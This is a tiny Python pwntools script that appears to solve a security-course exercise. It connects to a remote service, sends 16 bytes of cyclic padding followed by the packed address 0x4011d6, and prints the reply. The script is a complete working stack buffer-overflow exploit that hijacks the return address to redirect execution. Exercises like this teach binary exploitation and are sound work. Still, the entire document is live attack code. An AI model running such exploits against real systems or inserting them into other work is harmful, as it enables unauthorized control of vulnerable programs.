from pwn import *

io = remote('inf226.puffling.no', 7001)

io.send(cyclic(16) + p64(0x4011d6))

io.shutdown('out')

print(io.readall())
